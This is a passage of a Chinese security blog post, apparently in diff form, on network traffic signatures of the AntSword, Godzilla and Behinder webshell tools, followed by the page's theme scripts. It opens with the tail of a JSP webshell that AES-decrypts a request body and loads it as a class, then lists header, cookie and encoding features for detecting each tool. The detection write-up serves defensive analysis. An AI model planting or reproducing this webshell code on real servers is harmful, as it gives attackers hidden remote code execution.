c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);     </span><br><span class="line">  c.init(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(k.getBytes(),<span class="string">&quot;AES&quot;</span>));     </span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext); </span><br><span class="line">&#125; </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="动态特征"><a href="#动态特征" class="headerlink" title="动态特征"></a>动态特征</h3><h4 id="蚁剑-1"><a href="#蚁剑-1" class="headerlink" title="蚁剑"></a>蚁剑</h4><p>1、整个请求包都是用url编码</p>
+<p>2、@ini_set(“display_errors”，“0”);@set_time_limit(0)开头</p>
+<p>3、随机生成一个参数并向这个参数传入值，截取第三个字符之后进行base64解码可以得到明文payload</p>
+<h4 id="哥斯拉-1"><a href="#哥斯拉-1" class="headerlink" title="哥斯拉"></a>哥斯拉</h4><p>1、Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>所有响应中Cache-Control: no-store, no-cache, must-revalidate，上面的是一个jdk引入标志</p>
+<p>2、cookie在最后会出现分号; ，一般的http请求之后分号是不会出现的</p>
+<p>3、响应包结构特征一般为md5前16位+base64+md5后16位，md5只有0123456789ABCDEF范围，使用正则匹配容易分析出</p>
+<p>4、请求体特征，也就是base64编码</p>
+<h4 id="冰蝎-1"><a href="#冰蝎-1" class="headerlink" title="冰蝎"></a>冰蝎</h4><p>1、对http的数据包检测，一般会有一串字符在POST方法的前面</p>
+<p>2、检测accept头，一般来说是固定的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br></pre></td></tr></table></figure>
+
+<p>3、数据包长度较大(content-type)</p>
+<p>4、默认设置为长连接(keep-alive)</p>
+<p>5、端口检测，一般在49000-50000范围内会连接</p>
+<p>6、error_reporting(0)开头</p>
+<p>检测冰蝎还可以从以下几个方面入手</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312051615739.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312051615739.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>还看到一个师傅写的文章讲解如何100%捕捉冰蝎流量</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7606">https://xz.aliyun.com/t/7606</a></p>
+<h2 id="0x05总结"><a href="#0x05总结" class="headerlink" title="0x05总结"></a>0x05总结</h2><p>三个webshell工具各有千秋，一般来说普通的渗透测试使用蚁剑足矣，但冰蝎和哥斯拉对内网APT攻击的优势更大。其中识别冰蝎流量最直接的方法还可以观察cookie，正常的请求是不会携带cookie的。基本上这三个工具的共有特征都在accept头、content-type头、user-agent头都出现固定的形式，这个虽然不是比较有判断性，但是遇到一些不改特征的“脚本小子”也是有说法。常用的算法为aes、xor，最后都基本经过一次base64编码。</p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/webshell/" class="">
+              webshell
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>author:  </strong>wh1t3zer</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>link:  </strong>
+    <a href="/2023/12/02/webshell工具流量特征初探/" target="_blank" title="webshell工具流量特征初探">https://wh1t3zer.github.io/2023/12/02/webshell工具流量特征初探/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>Copyright notice:   </strong>
+      All articles on this website, unless otherwise stated, adopt <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      reprint policy. If reproduced, please indicate source!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/img10.jpg" class="lazyload placeholder" data-srcset="/medias/img10.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+    </div>
+    <a href="/2023/10/22/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="post-nav-link">
+      <div class="title">
+        Next: <i class="fas fa-angle-right"></i>
+        <div class="title-text">SQL注入总结</div>
+      </div>
+      <!-- <div class="content">
+        0x00前言mysql.innodb_schema_stat
+sys.x$statement_analysis
+sys.
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>catalog</span>
+        
+          <div class="toc-open-close">catalog</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
+  
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || '#42b983';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2022 - 2025 <a target="_blank" rel="noopener" href="https://github.com/wh1t3zer">wh1t3zer</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+            <!-- 不蒜子统计 -->
+            <!-- 不蒜子统计 -->
+<span id="busuanzi_container_site_pv">
+      <i class="fas fa-eye" aria-hidden="true"></i>Total visits：<span id="busuanzi_value_site_pv"></span> times
+</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+      <i class="fas fa-users" aria-hidden="true"></i>Number of visitors：<span id="busuanzi_value_site_uv"></span> people
+</span>
+
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark">
+  <div class="dark-content">
+    <i class="fas fa-moon" aria-hidden="true"></i>
+    <!-- <span>关灯</span> -->
+  </div>
+  
+</div>
+
+<script>
+  $(function() {
+    let isDark = JSON.parse(localStorage.getItem('dark'))  || JSON.parse('false');
+    if (isDark) {
+      $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+    }
+    $('.dark').click(function() {
+      if ($(document.body).is('.darkModel')) {
+        $(document.body).removeClass('darkModel');
+        localStorage.setItem('dark', false);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-moon" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      } else {
+        $(document.body).addClass('darkModel');
+        localStorage.setItem('dark', true);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      }
+    })
+  })
+</script>
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  display: none;
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  display: none;
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="netease"
+  type="playlist"
+  id="3116359624"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script>
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -80,
+    headingsOffset: -($(window).height() * 0.4 - 45),
+    positionFixedSelector: '.toc-main',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 100) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('toc-aside')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  }
+</style> 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const headerMenuTransparent = true;
+    if (!headerMenuTransparent) { return; }
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
